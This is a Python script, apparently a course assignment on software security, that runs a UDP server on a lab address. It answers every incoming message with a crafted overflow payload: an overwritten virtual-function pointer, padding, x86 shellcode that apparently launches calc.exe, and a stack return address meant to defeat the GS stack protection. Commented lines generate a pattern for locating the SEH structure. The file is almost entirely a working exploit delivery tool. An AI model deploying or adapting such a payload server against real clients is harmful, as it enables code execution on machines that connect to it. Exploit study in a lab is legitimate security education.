#!/bin/env python3
# -*- coding: utf-8 -*-
# version: Python3.X
''' 软件安全与漏洞分析第九周任务, 目的是实现 GS 安全机制的绕过, 通过虚函数来实现
'''
__author__ = '__L1n__w@tch'

import socketserver

virtual_func_address = b"\x77\xdd\xcb\x23"[::-1]
shell_code_stack_address = b"\x00\x12\xFD\x28"[::-1]
shell_code = b"\x33\xC0\x50\xB8\x2E\x65\x78\x65\x50\xB8\x63\x61\x6C\x63\x50\x8D\x04\x24\x50\xB9\xC7\x93\xBF\x77\xFF\xD1"
junk_1 = b"A" * 92
junk_2 = b"B" * (140 - 92 - len(shell_code))


class MyUDPHandler(socketserver.BaseRequestHandler):
    """
    This class works similar to the TCP handler class, except that
    self.request consists of a pair of data and client socket, and since
    there is no connection the client address must be given explicitly
    when sending data back via sendto().
    """

    def handle(self):
        global virtual_func_address, shell_code, shell_code_stack_address, junk_2, junk_1

        data = self.request[0].strip()
        socket = self.request[1]
        print("{} wrote:".format(self.client_address[0]))
        print(data)

        ## 正常发送
        # socket.sendto(data.upper(), self.client_address)

        ## 用来定位 SEH 结构
        # data = b""
        # for i in range(300):
        #     data += bytes([ord("A") + i // 10])
        # print(data)

        ## ShellCode 发送
        payload = virtual_func_address + junk_1 + shell_code + junk_2 + shell_code_stack_address
        socket.sendto(payload, self.client_address)


def main():
    HOST, PORT = "192.168.117.1", 9999
    server = socketserver.UDPServer((HOST, PORT), MyUDPHandler)
    server.serve_forever()


if __name__ == "__main__":
    main()
